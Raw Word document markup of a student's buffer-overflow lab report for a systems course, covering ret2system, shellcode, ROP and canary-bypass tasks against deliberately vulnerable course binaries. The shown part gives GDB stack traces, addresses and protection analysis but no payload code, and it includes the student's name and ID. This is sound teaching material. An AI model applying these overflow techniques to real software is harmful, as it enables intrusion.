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36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2"/>
        </w:rPr>
        <w:t>复旦大学 计算机系统基础（2026 年秋季学期）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color w:val="1F3864"/>
          <w:sz w:val="48"/>
        </w:rPr>
        <w:t>Lab3：AttackLab 实验报告</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="520"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="2F5597"/>
          <w:sz w:val="26"/>
        </w:rPr>
        <w:t>缓冲区溢出 · 栈空间执行 · ROP · Canary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4592"/>
        <w:gridCol w:w="4592"/>
      </w:tblGrid>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4252"/>
            <w:tcMar>
              <w:top w:w="70" w:type="dxa"/>
              <w:left w:w="120" w:type="dxa"/>
              <w:bottom w:w="70" w:type="dxa"/>
              <w:right w:w="120" w:type="dxa"/>
            </w:tcMar>
            <w:shd w:val="clear" w:color="auto" w:fill="EDF2F9"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b/>
                <w:i w:val="0"/>
                <w:color w:val="1F3864"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>姓名</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="425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0"/>
              </w:rPr>
              <w:t>许波婧</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4252"/>
            <w:tcMar>
              <w:top w:w="70" w:type="dxa"/>
              <w:left w:w="120" w:type="dxa"/>
              <w:bottom w:w="70" w:type="dxa"/>
              <w:right w:w="120" w:type="dxa"/>
            </w:tcMar>
            <w:shd w:val="clear" w:color="auto" w:fill="EDF2F9"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b/>
                <w:i w:val="0"/>
                <w:color w:val="1F3864"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>学号</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="425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0"/>
              </w:rPr>
              <w:t>25303060076</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4252"/>
            <w:tcMar>
              <w:top w:w="70" w:type="dxa"/>
              <w:left w:w="120" w:type="dxa"/>
              <w:bottom w:w="70" w:type="dxa"/>
              <w:right w:w="120" w:type="dxa"/>
            </w:tcMar>
            <w:shd w:val="clear" w:color="auto" w:fill="EDF2F9"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b/>
                <w:i w:val="0"/>
                <w:color w:val="1F3864"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>实验仓库</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="425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0"/>
              </w:rPr>
              <w:t>github.com/Marinabobo/AttackLab</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4252"/>
            <w:tcMar>
              <w:top w:w="70" w:type="dxa"/>
              <w:left w:w="120" w:type="dxa"/>
              <w:bottom w:w="70" w:type="dxa"/>
              <w:right w:w="120" w:type="dxa"/>
            </w:tcMar>
            <w:shd w:val="clear" w:color="auto" w:fill="EDF2F9"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b/>
                <w:i w:val="0"/>
                <w:color w:val="1F3864"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>完成日期</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="425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0"/>
              </w:rPr>
              <w:t>2026 年 10 月 28 日</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl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548235"/>
          <w:bottom w:val="nil"/>
          <w:right w:val="nil"/>
          <w:insideH w:val="nil"/>
          <w:insideV w:val="nil"/>
        </w:tblBorders>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="9184"/>
      </w:tblGrid>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="9184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本地验证结果：4 / 4 payload 全部通过（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8"/>
              </w:rPr>
              <w:t>payload.py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8"/>
              </w:rPr>
              <w:t>payload_dark.py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8"/>
              </w:rPr>
              <w:t>payload_rop.py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8"/>
              </w:rPr>
              <w:t>payload_canary.py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）。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8"/>
              </w:rPr>
              <w:t>attack/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下二进制 SHA-256 与模板 workflow 记录一致，未做任何修改。</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p>
      <w:pPr>
        <w:spacing w:after="40"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="16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本报告按实验文档的任务顺序组织：先建立调用栈与缓冲区溢出的直观认识，再依次完成 ret2system、固定栈 shellcode、ROP 和 Canary 绕过四个任务；最后讨论 ASLR、NX 与 Stack Protector 的防御思想。所有地址、寄存器和内存内容均来自本机 WSL2 中的 GDB 实测。</w:t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1  实验环境与目标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实验在 Windows 11 的 WSL2 Ubuntu 环境中完成，使用模板仓库提供的 64 位 ELF 二进制，不重新编译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attack/</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 下的任何文件。主要工具如下：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版本 / 说明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操作系统</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7143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WSL2，Linux 6.18.33.2-microsoft-standard-WSL2，x86_64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编译器（仅用于 aslr.c）</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7143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gcc (Ubuntu) 15.2.0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调试器</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7143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GNU gdb 17.1（原生 GDB；用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bt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info registers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x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达到 GEF 同等观察目的）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7143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Python 3.14.4（payload 生成脚本仅使用标准库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struct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sys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目标程序</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7143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attack/dark-calc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attack/dark-calc-nx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attack/dark-log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attack/malware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1  实验环境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三个目标程序的保护属性由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readelf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与反汇编确认：它们都是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ET_EXEC</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>（Non-PIE），因此代码段地址固定；</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="A61B29"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>dark-calc-nx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dark-log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GNU_STACK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RW</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>，栈不可执行；</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="A61B29"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>dark-calc</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 虽然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GNU_STACK</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 也是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RW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，但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init_fixed_stack()</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 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mmap(..., PROT_EXEC)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 额外映射了一块固定地址、可读可写可执行的栈，这是任务二特意营造的“楚门的世界”。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  <w:cantSplit/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="187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二进制</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1247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835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栈</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020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Canary</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="204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本实验中的用途</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="187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dark-calc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ET_EXEC</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="283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固定地址 + 可执行（自定义 mmap）</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020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04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任务一、任务二</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="187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dark-calc-nx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ET_EXEC</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="283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随机地址 + NX</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020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04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任务三 ROP</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="187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dark-log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ET_EXEC</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="283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随机地址 + NX</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020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</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="204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任务四 Canary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2  目标程序的保护属性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关键符号地址如下（均由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nm -n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与反汇编确认）：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204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符号</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268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dark-calc</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="249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dark-calc-nx</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268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dark-log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input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0x401977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0x401868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0x4016d6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eval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0x4019d7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0x4018c8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grade_eval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0x401a87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0x401978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0x401677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main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0x401ac3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0x4019b4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0x4017f5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command_buf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0x6030d0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0x602090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3  本实验用到的关键符号地址</w:t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2  程序的调用栈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这一节回答实验文档“观察栈帧 input”的五个问题。调试时在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0x40197f</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 处下断点，该地址位于函数 prologue 之后、第一条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printf</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 参数准备指令之前。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2.1  input 是谁调用的？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在 GDB 中执行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b *0x40197f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bt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的输出为：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(gdb) bt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#0  0x000000000040197f in input ()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#1  0x0000000000401ad1 in main ()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  input 的调用栈（trace）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因此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由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调用。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中的调用点在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0x401acc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，返回地址是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0x401ad1</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>。此时寄存器与栈的关键内容为：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rip = 0x40197f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 = 0x721000800fe0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 = 0x721000800fd0</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">。由于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dark-calc</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 使用固定栈，这些地址在多次运行中保持不变。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2.2  停下位置之前的三条指令与 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="A61B29"/>
          <w:sz w:val="23"/>
        </w:rPr>
        <w:t>$rbp</w:t>
      </w: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 的来源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0x40197f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之前的三条指令是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prologue：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247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地址</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="181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机器码</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438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汇编</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3572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0x401977</w:t>
            </w:r>
          </w:p>
        </w:tc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55</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="243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push rbp</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="357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把调用者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main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保存到栈上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0x401978</w:t>
            </w:r>
          </w:p>
        </w:tc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48 89 e5</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="243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mov rbp, rsp</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="357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让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指向当前栈帧底部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0x40197b</w:t>
            </w:r>
          </w:p>
        </w:tc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48 83 ec 10</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="243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sub rsp, 0x10</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="357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为 16 字节的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expression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分配空间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4  input 的 prologue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断点处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$rbp = 0x721000800fe0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[$rbp] = 0x721000800ff0</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">。这个值来自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0x401ac4</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 执行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mov rbp, rsp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 = 0x721000800ff0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push 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把这个值压到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0x721000800fe0</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">，随后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mov rbp, rsp</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 才让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指向这个保存槽。因此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[$rbp]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是“调用者的栈帧基址”，也是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leave</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 时用来恢复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现场的值。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2.3  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="A61B29"/>
          <w:sz w:val="23"/>
        </w:rPr>
        <w:t>$rbp + 8</w:t>
      </w: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 处是什么？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断点处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[$rbp + 8] = 0x401ad1</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">。查看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disas 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可以确认，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0x401ad1</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 正是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call 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之后的那条指令：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0x401ac3 &lt;main&gt;:        push   rbp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0x401ac4 &lt;main+1&gt;:      mov    rbp,rsp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0x401ac7 &lt;main+4&gt;:      mov    eax,0x0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0x401acc &lt;main+9&gt;:      call   0x401977 &lt;input&gt;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0x401ad1 &lt;main+14&gt;:     mov    eax,0x0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0x401ad6 &lt;main+19&gt;:     call   0x4019d7 &lt;eval&gt;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2  main 中 input 的调用点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所以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[$rbp + 8]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的返回地址：函数返回后，CPU 会回到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main+14</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 继续执行。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2.4  哪条指令把值写入了 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="A61B29"/>
          <w:sz w:val="23"/>
        </w:rPr>
        <w:t>$rbp + 8</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="黑体"/>
          <w:b/>
          <w:i w:val="0"/>
          <w:color w:val="2F5597"/>
          <w:sz w:val="26"/>
        </w:rPr>
        <w:t>？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的调用点之前（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0x401ac7</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">）下断点，单步执行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mov eax,0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call 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，观察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</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 和栈内容：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Breakpoint 2, 0x0000000000401ac7 in main ()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-- before call --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rip = 0x401ac7   rbp = 0x721000800ff0   rsp = 0x721000800ff0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0x721000800ff0: 0x00007fffffffe4a0  0x0000000000401c1f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-- after call 0x401977 &lt;input&gt; --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rip = 0x401977   rbp = 0x721000800ff0   rsp = 0x721000800fe8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0x721000800fe8: 0x0000000000401ad1  0x00007fffffffe4a0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-- after input's push rbp --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rip = 0x401978   rbp = 0x721000800ff0   rsp = 0x721000800fe0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0x721000800fe0: 0x0000721000800ff0  0x0000000000401ad1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3  从 main 单步进入 input 时的栈变化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答案是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main+9</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 处的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call 0x401977 &lt;input&gt;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（地址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0x401acc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call</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 先把下一条指令的地址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0x401ad1</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 压栈（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</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 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0x...0ff0</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 减到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0x...0fe8</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">），再跳转到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。紧接着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push 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又压入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0x...0ff0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，所以等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被设为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0x...0fe0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 + 8 = 0x...0fe8</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 正好就是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call</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 压入返回地址的位置。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2.5  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="A61B29"/>
          <w:sz w:val="23"/>
        </w:rPr>
        <w:t>call</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="黑体"/>
          <w:b/>
          <w:i w:val="0"/>
          <w:color w:val="2F5597"/>
          <w:sz w:val="26"/>
        </w:rPr>
        <w:t>、prologue、</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="A61B29"/>
          <w:sz w:val="23"/>
        </w:rPr>
        <w:t>leave</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="黑体"/>
          <w:b/>
          <w:i w:val="0"/>
          <w:color w:val="2F5597"/>
          <w:sz w:val="26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23"/>
        </w:rPr>
        <w:t>ret</w:t>
      </w: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 的作用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把断点设在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leave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0x4019d5</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>），继续单步，得到下表。表中地址均来自同一次运行。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36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关键指令</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1247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rsp</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1247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rbp</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4195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栈 / 控制流变化</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="113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main 调用前</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="13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0x...0ff0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0x...0ff0</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="419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[rsp]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是 main 保存的 rbp，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[rsp+8]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是 __wrap_main 的返回地址</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="113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执行 call</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="13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call input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0x...0fe8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0x...0ff0</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="419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压入返回地址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0x401ad1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，跳到 input</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="113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prologue</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="13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push rbp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0x...0fe0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0x...0ff0</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="419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保存 main 的 rbp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0x...0ff0</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="113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prologue</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="13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mov rbp,rsp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0x...0fe0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0x...0fe0</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="419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rbp 指向当前帧底部</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="113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prologue</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="13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sub rsp,0x10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0x...0fd0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0x...0fe0</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
